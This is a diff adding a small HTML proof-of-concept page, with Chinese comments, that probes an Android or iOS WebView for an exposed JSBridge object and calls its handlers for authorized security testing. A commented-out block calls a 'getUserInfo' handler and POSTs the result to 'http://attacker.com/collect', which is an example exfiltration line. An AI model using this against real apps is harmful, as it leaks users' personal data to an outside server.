@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+    // 1. 检测是否存在 JSBridge 对象
+    var bridge = window.Bridge || window.baiduBox || window.JSBridge;
+    
+    if (bridge) {
+        console.log("JSBridge detected!");
+        
+        // 2. 尝试调用低风险接口验证连通性 (如获取版本号)
+        // 注意：具体方法名需通过逆向或文档确认，此处为伪代码
+        bridge.callHandler('getAppVersion', {}, function(response) {
+            alert("App Version: " + response);
+        });
+
+        // 3. 高危接口测试 (仅用于授权测试，切勿用于非法目的)
+        // 假设存在 getUserInfo 接口
+        /*
+        bridge.callHandler('getUserInfo', {}, function(response) {
+            console.log("User Info Leaked:", response);
+            // 将数据发送到攻击者服务器
+            fetch('http://attacker.com/collect', {
+                method: 'POST',
+                body: JSON.stringify(response)
+            });
+        });
+        */
+    } else {
+        alert("No JSBridge found.");
+    }
+</script>
+</body>
+</html>
